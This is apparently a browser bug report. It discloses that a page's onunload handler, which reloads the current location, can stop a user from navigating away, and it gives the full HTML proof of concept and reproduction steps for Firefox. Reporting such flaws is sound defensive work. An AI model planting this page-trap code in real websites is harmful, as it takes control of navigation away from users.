Using a well crafted JavaScipt function, triggered by page onunload, a website author can prevent a user from leaving a web-page, either by entering a new location, or loading a bookmark.

Reproducible: Always

Steps to Reproduce:
1. Create a new file called anti.html containing the following HTML code:

<html>
	<head>
		<script type="text/javascript">
			<!--
			function anti(){top.location.replace(top.location);}
			// -->
		</script>
	</head>
	<body onunload="anti();">
		<p>Hello world!</p>
	</body>
</html>

2. Open the file anti.html in Firefox.
3. Now try to leave that page by entering a new location or loading a bookmark...
Actual Results:  
You cannot leave the page.

Expected Results:  
You should be able to leave the page as this type of loop should not be permitted to work.

There should be an option to disable onunload JavaScript calls, or at least a pop-up alert saying one is about to run and does the user wish to continue.
